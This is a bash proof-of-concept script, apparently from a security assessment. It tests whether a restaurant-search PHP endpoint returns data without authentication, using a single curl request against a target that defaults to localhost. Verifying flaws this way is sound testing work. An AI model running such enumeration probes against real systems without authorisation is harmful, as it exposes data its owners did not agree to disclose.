#!/bin/bash

# POC: Unauthenticated Access to Search Restaurants Endpoint
# This script demonstrates that the search_restaurants.php endpoint is accessible
# without any authentication, allowing unauthorized data enumeration

TARGET_URL="${1:-http://localhost:8080}"
ENDPOINT="/api/search_restaurants.php"

echo "[*] Testing Unauthenticated Access to Search Restaurants Endpoint"
echo "[*] Target: $TARGET_URL$ENDPOINT"
echo ""

# Test 1: Verify no authentication is required
echo "[TEST 1] Accessing search_restaurants.php without any credentials"
echo "Command: curl -s -i '$TARGET_URL$ENDPOINT?query=italian'"
echo ""

RESPONSE=$(curl -s -i "$TARGET_URL$ENDPOINT?query=italian")
HTTP_STATUS=$(echo "$RESPONSE" | head -n 1)
BODY=$(echo "$RESPONSE" | tail -n +2 | grep -v '^$')

echo "Response:"
echo "$HTTP_STATUS"
echo ""

# Check if we got HTTP 200 with restaurant data
if echo "$HTTP_STATUS" | grep -q "200"; then
    echo "[+] SUCCESS: Endpoint returned HTTP 200 without authentication"
    echo "[+] Response body contains restaurant data:"
    echo "$BODY" | head -c 500
    echo ""
    echo ""
    
    # Verify the response contains valid restaurant data
    if echo "$BODY" | grep -q '"success":true'; then
        echo "[+] SUCCESS: Valid restaurant data returned"
        echo "[+] Restaurant information disclosed:"
        echo "$BODY" | jq '.' 2>/dev/null || echo "$BODY"
        exit 0
    fi
else
    echo "[-] FAILED: Endpoint did not return HTTP 200"
    echo "Full response:"
    echo "$RESPONSE"
    exit 1
fi